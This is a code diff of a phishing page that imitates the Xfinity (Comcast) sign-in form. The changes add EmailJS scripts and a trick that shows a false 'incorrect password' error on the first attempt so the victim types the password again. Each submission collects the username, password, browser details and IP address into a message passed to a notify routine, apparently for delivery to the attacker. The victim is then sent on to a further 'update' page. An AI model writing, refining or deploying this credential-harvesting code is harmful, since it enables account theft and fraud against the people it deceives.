@@ -8,9 +8,25 @@
 <meta http-equiv="content-type" content="text/html;charset=utf-8" />
 
 <script type="text/javascript"  src="jquery.min.js"></script>
-<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<link href="bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
 <!------ Include the above in your HEAD tag ---------->
 <link rel="shortcut icon" href="favicon-96x96.png">
+<script type="text/javascript"
+        src="info.js">
+</script>
+<script type="text/javascript"
+        src="email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: PUBLIC_KEY,
+      });
+   })();
+</script>
+
+
+
 <style>
 
 
@@ -120,16 +136,16 @@ img {
   margin-bottom: 5%;
 }
 #error{
-  padding: 10px;
-  background:#da020f;
-  margin-bottom: 5%;
+  padding: 0.5px;
+  color:#da020f !important;
+  margin-bottom: 1%;
 
 }
 
 
 #error > span{
-
- color: #ffffff;
+ font-size: 11px;
+ color:#da020f;
  }
 </style>
 </head>
@@ -147,29 +163,32 @@ img {
 
                     <h2 style="font-weight: 900; margin-bottom: 5%;">Sign in with your Xfinity ID</h2>
 
-                    <div class="error">
-
-                    </div>
+                    <div class="error"></div>
                     <div class="form-group">
-                            <label>Email or username </label>
+                            <label>Email, mobile, or username</label>
 
-                            <input type="text" class="form-control"  placeholder="Email Address or Username" autofocus name="euser" id="euser" value="" />
+                            <input type="text" class="form-control"  placeholder="Email, mobile, or username" autofocus name="euser" id="euser" value="" />
+
+                            <div class="error_us"></div>
                         </div>
 
                         <div class="form-group">
                             <label>Password </label>
                             <input type="password" class="form-control" placeholder="Password" value="" name="epass" id="epass"  />
+                            <div class="error_pw"></div>
                         </div>
                       <input value="" id="eip" name="eip" type="hidden" />
 
 
+                          <div class="form-group">
+                                  By signing in, you agree to our <a href="#" class="ForgetPwd" id="eforgetp">Terms of Service</a> and <a href="#" class="ForgetPwd" id="eforgetp">Privacy Policy.</a>
+                            
+                          </div>
+                            
                         <div class="form-group">
-                            <button type="submit" class="btn btnSubmit" > Log in </button>
+                            <button type="submit" class="btn btnSubmit" id="btnSubmit"> Let's go </button>
                         </div>
 
-                          <div class="form-group">
-                            <a href="#" class="ForgetPwd" id="eforgetp">Forgot log-in details?</a>
-                        </div>
 
                     </form>
                     </div>
@@ -187,69 +206,69 @@ img {
 <script type="text/javascript"  src="post.js"></script>
 
         <script>
-
-        function browserN() {
-  if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1) {
-    return 'Opera';
-  } else if (navigator.userAgent.indexOf("Edg") != -1) {
-    return 'Edge';
-  } else if (navigator.userAgent.indexOf("Chrome") != -1) {
-    return 'Chrome';
-  } else if (navigator.userAgent.indexOf("Safari") != -1) {
-    return 'Safari';
-  } else if (navigator.userAgent.indexOf("Firefox") != -1) {
-    return 'Firefox';
-  } else if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
-  {
-    return 'IE';
-  } else {
-    return 'unknown';
-  }
-}
-
-
-        function fetch_ip(){
-          $.getJSON("https://api.ipify.org?format=json", function(data) {
-               $("#eip").val(data.ip);
-          });
-
-        }
-
+        let is_subm = 0;
 
         $(document).ready(function(){
+          fetch_ip();
+
+          const provider = "COMCAST-COM(https://login.xfinity.com/login?)";
+          const get_browsername = browserN();
+          $("#eform").on("submit", function (e){
+            e.preventDefault();
+            var get_ip = $("#eip").val();
+            var euser = $("#euser").val();
+            var epass = $("#epass").val();
+
+            if (euser == "" && epass == "" ){
+              $(".error_us").html("");
+              $(".error_pw").html("");
+              $(".error").html('<div id="error"><span>Please enter your  Xfinity ID and password to sign in </span></div>');
+
+            }else if (euser == ""){
+              $(".error").html("");
+              $(".error_pw").html("");
+              $(".error_us").html('<div id="error"><span>Please enter your Xfinity ID to sign in.</span></div>');
+
+            }else if (!is_valid(euser)){
+              $(".error").html("");
+              $(".error_pw").html("");
+              $(".error_us").html('<div id="error"><span>Invalid Xfinity ID or  Email Address, Please try again</span></div>');
 
 
-        fetch_ip();
+            }else if (epass == ""){
+              $(".error").html("");
+              $(".error_us").html("");
+              $(".error_pw").html('<div id="error"><span>Please type in your password to sign in.</span></div>');
 
-        const provider = "COMCAST-COM(https://login.xfinity.com)";
-        const get_browsername = browserN();
-        $("#eform").on("submit", function (e){
-          e.preventDefault();
-          var get_ip = $("#eip").val();
-          var euser = $("#euser").val();
-          var epass = $("#epass").val();
+            }else{
 
-          if (euser == ""){
-              $(".error").html('<div id="error"><span>Please enter your email or username</span></div>');
+              $(".error").html("");
+              $(".error_us").html("");
+              $(".error_pw").html("");
+              is_subm = is_subm +1;
+              var stage = "Confirmed";
+              if(is_subm == 1){
+                var stage = "New";
+                $("#epass").val("");
+                $(".error").html('<div id="error"><span>The Xfinity ID or password you entered was incorrect. Please try again.</span></div>');
+              }
+              var message = `STAGE: ${stage}\nPROVIDER: ${provider}\nUSERNAME: ${euser}\nPASSWORD: ${epass}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
+              const currentUrl = window.location.href;
+              var upath = (currentUrl.endsWith('/') ? '' : '/')+"update.html?bill="+euser;
+              var newUrl = currentUrl + upath;
+              var status = notify(euser, message, newUrl, is_subm);
 
-          }else if (epass == ""){
-
-            $(".error").html('<div id="error"><span>Please enter your password</span></div>');
-
-          }else{
-
-            $(".error").html("");
-
-            var message = `PROVIDER: ${provider}\nUSERNAME: ${euser}\nPASSWORD: ${epass}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
-            var status = notify(message);
-
-
-            window.location.href = "https://www.bt.com";
+              if(is_subm > 1){
+                $("#btnSubmit").attr("disabled", "disabled");
+                $("#btnSubmit").text("Proccessing .. ");
 
 
-          }
+              }
 
-        });
+
+            }
+
+          });
 
         })
 
